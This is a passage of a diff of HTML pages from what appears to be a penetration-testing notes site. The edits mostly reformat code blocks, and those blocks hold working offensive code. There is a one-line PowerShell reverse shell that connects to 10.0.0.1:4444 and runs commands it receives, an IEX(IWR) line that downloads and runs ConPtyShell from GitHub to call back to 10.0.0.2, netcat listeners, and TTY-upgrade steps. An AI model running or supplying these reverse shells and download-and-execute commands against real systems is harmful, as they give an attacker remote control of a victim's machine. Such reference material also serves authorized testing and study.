class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span>  <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
-</code></pre></div></p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.0.0.1&#39;</span><span class="p">,</span><span class="n">4444</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span>  <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</code></pre></div>
+</td></tr></table></p>
 <h3 id="conpty">ConPty</h3>
 <ul>
 <li><a href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1">Github</a></li>
 </ul>
-<div class="highlight"><pre><span></span><code><span class="n">IEX</span><span class="p">(</span><span class="nb">IWR </span><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">antonioCoco</span><span class="p">/</span><span class="n">ConPtyShell</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="nb">Invoke-ConPtyShell</span><span class="p">.</span><span class="n">ps1</span><span class="p">);</span> <span class="nb">Invoke-ConPtyShell</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="n">3001</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="n">IEX</span><span class="p">(</span><span class="nb">IWR </span><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">antonioCoco</span><span class="p">/</span><span class="n">ConPtyShell</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="nb">Invoke-ConPtyShell</span><span class="p">.</span><span class="n">ps1</span><span class="p">);</span> <span class="nb">Invoke-ConPtyShell</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="n">3001</span>
 </code></pre></div>
+</td></tr></table>
 <div class="admonition note">
 <p class="admonition-title">Note</p>
 <p>Fully interactive shell, but needs Rows and Cols. As noted on the repo, it is possible to avoid setting these params if the listener is started like this: <code>stty raw -echo; (stty size; cat) | nc -lvnp 3001</code></p>
@@ -628,7 +854,20 @@ Example:
 <code>rlwrap nc -lvnp 1234</code></p>
 <p>Another improvement for the shell could be putting the "host" shell on raw mode to use keyboard shortcuts or editor programs on your reverse shell.
 That can be achieved doing the following:</p>
-<div class="highlight"><pre><span></span><code>ctrl+z
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>ctrl+z
 <span class="nb">echo</span> <span class="nv">$TERM</span> <span class="o">&amp;&amp;</span> tput lines <span class="o">&amp;&amp;</span> tput cols
 
 <span class="c1"># for bash</span>
@@ -643,6 +882,7 @@ reset
 <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
 stty rows &lt;num&gt; columns &lt;cols&gt;
 </code></pre></div>
+</td></tr></table>
 <p>Note the detail on zsh. The motivation behind doing the trick different resides on this information taken from PayloadsAllTheThings repo:</p>
 <div class="admonition quote">
 <p class="admonition-title">Quote</p>
@@ -726,7 +966,7 @@ stty rows &lt;num&gt; columns &lt;cols&gt;
       <script>
         app = initialize({
           base: "../..",
-          features: ['navigation.expand', 'toc.integrate'],
+          features: ['navigation.sections', 'navigation.expand'],
           search: Object.assign({
             worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
           }, typeof search !== "undefined" && search)
